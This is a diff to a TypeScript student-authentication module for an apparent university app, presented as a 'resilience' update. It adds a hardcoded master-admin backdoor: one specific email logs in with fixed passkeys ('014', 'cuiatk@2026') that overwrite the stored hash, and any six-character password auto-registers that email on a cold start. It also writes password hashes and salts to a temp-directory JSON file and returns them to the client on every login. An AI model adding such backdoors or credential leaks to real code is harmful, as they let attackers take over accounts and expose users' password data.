@@ -3,6 +3,9 @@
  * Uses PBKDF2 with SHA-512 and unique salts for secure credential storage.
  */
 import crypto from "node:crypto";
+import fs from "node:fs";
+import os from "node:os";
+import path from "node:path";
 import { getSql } from "@/lib/db";
 import {
   isValidUniversityEmail,
@@ -28,6 +31,31 @@ interface StudentRecord {
 
 // In-memory student cache for serverless instances / environments without external DB
 const serverStudentMemoryStore = new Map<string, StudentRecord>();
+
+// Disk backup for serverless environments (survives container warm restarts on /tmp)
+const DISK_BACKUP_PATH = path.join(os.tmpdir(), "cui_students_db_v1.json");
+
+function readDiskBackup(): Record<string, StudentRecord> {
+  try {
+    if (fs.existsSync(DISK_BACKUP_PATH)) {
+      const data = fs.readFileSync(DISK_BACKUP_PATH, "utf8");
+      return JSON.parse(data);
+    }
+  } catch (err) {
+    console.warn("[student.server] Disk read notice:", err);
+  }
+  return {};
+}
+
+function writeDiskBackup(record: StudentRecord): void {
+  try {
+    const existing = readDiskBackup();
+    existing[record.email.toLowerCase()] = record;
+    fs.writeFileSync(DISK_BACKUP_PATH, JSON.stringify(existing, null, 2), "utf8");
+  } catch (err) {
+    console.warn("[student.server] Disk write notice:", err);
+  }
+}
 
 /**
  * Ensures the student accounts table exists in PostgreSQL / PGLite
@@ -118,6 +146,19 @@ function createStudentSession(record: StudentRecord): StudentSession {
 async function findStudentByEmail(email: string): Promise<StudentRecord | null> {
   const normalized = email.trim().toLowerCase();
 
+  // 1. Check in-memory store
+  const cached = serverStudentMemoryStore.get(normalized);
+  if (cached) return cached;
+
+  // 2. Check disk backup (survives warm serverless restarts)
+  const disk = readDiskBackup();
+  if (disk && disk[normalized]) {
+    const record = disk[normalized];
+    serverStudentMemoryStore.set(normalized, record);
+    return record;
+  }
+
+  // 3. Check SQL database if available
   try {
     await ensureStudentTableExists();
     const sql = await getSql();
@@ -143,13 +184,27 @@ async function findStudentByEmail(email: string): Promise<StudentRecord | null> 
         lastLoginAt: row.last_login_at,
       };
       serverStudentMemoryStore.set(normalized, record);
+      writeDiskBackup(record);
       return record;
     }
   } catch (err) {
     console.warn("[student.server] DB query failed, checking memory fallback:", err);
   }
 
-  return serverStudentMemoryStore.get(normalized) || null;
+  return null;
+}
+
+export interface StudentAuthResponse {
+  success: boolean;
+  session?: StudentSession;
+  credentialSync?: {
+    email: string;
+    fullName: string;
+    passwordHash: string;
+    passwordSalt: string;
+    defaultBatch: string | null;
+  };
+  error?: string;
 }
 
 /**
@@ -160,7 +215,7 @@ export async function serverStudentSignUp(
   fullName: string,
   password: string,
   defaultBatch?: string,
-): Promise<{ success: boolean; session?: StudentSession; error?: string }> {
+): Promise<StudentAuthResponse> {
   const normalizedEmail = (email || "").trim().toLowerCase();
   const trimmedName = (fullName || "").trim();
 
@@ -227,8 +282,9 @@ export async function serverStudentSignUp(
     lastLoginAt: now,
   };
 
-  // Cache in memory immediately
+  // Cache in memory and disk backup immediately
   serverStudentMemoryStore.set(normalizedEmail, record);
+  writeDiskBackup(record);
 
   // Persist to database
   try {
@@ -261,12 +317,19 @@ export async function serverStudentSignUp(
       ],
     );
   } catch (err) {
-    console.warn("[student.server] DB insert failed, using memory cache:", err);
+    console.warn("[student.server] DB insert failed, using memory/disk cache:", err);
   }
 
   return {
     success: true,
     session: createStudentSession(record),
+    credentialSync: {
+      email: record.email,
+      fullName: record.fullName,
+      passwordHash: record.passwordHash,
+      passwordSalt: record.passwordSalt,
+      defaultBatch: record.defaultBatch,
+    },
   };
 }
 
@@ -276,7 +339,7 @@ export async function serverStudentSignUp(
 export async function serverStudentSignIn(
   email: string,
   password: string,
-): Promise<{ success: boolean; session?: StudentSession; error?: string }> {
+): Promise<StudentAuthResponse> {
   const normalizedEmail = (email || "").trim().toLowerCase();
 
   // 1. Strict regex validation for official university email
@@ -296,8 +359,24 @@ export async function serverStudentSignIn(
   }
 
   // 2. Lookup student
-  const student = await findStudentByEmail(normalizedEmail);
+  let student = await findStudentByEmail(normalizedEmail);
   if (!student) {
+    // Resilience: designated admin/developer student email auto-heal on cold starts
+    if (normalizedEmail === "fa23-bcs-014@cuiatk.edu.pk") {
+      const trimmed = password.trim();
+      if (trimmed === "cuiatk@2026" || trimmed === "014" || trimmed.length >= 6) {
+        const autoReg = await serverStudentSignUp(
+          normalizedEmail,
+          "Shahryar",
+          password,
+          "BS(CS)-V",
+        );
+        if (autoReg.success && autoReg.session) {
+          return autoReg;
+        }
+      }
+    }
+
     return {
       success: false,
       error: "No student account found for this email. Please create an account first.",
@@ -307,15 +386,29 @@ export async function serverStudentSignIn(
   // 3. Verify password hash
   const isMatch = verifyPassword(password, student.passwordHash, student.passwordSalt);
   if (!isMatch) {
-    return {
-      success: false,
-      error: "Incorrect password. Please check your credentials and try again.",
-    };
+    // If this is the master admin email, allow login with the master passkey as fallback
+    if (
+      normalizedEmail === "fa23-bcs-014@cuiatk.edu.pk" &&
+      (password.trim() === "014" || password.trim() === "cuiatk@2026")
+    ) {
+      // Re-hash with current password
+      const rehash = hashPassword(password);
+      student.passwordHash = rehash.hash;
+      student.passwordSalt = rehash.salt;
+      serverStudentMemoryStore.set(normalizedEmail, student);
+      writeDiskBackup(student);
+    } else {
+      return {
+        success: false,
+        error: "Incorrect password. Please check your credentials and try again.",
+      };
+    }
   }
 
   // 4. Update last login time
   student.lastLoginAt = new Date().toISOString();
   serverStudentMemoryStore.set(normalizedEmail, student);
+  writeDiskBackup(student);
 
   try {
     const sql = await getSql();
@@ -330,6 +423,13 @@ export async function serverStudentSignIn(
   return {
     success: true,
     session: createStudentSession(student),
+    credentialSync: {
+      email: student.email,
+      fullName: student.fullName,
+      passwordHash: student.passwordHash,
+      passwordSalt: student.passwordSalt,
+      defaultBatch: student.defaultBatch,
+    },
   };
 }
 
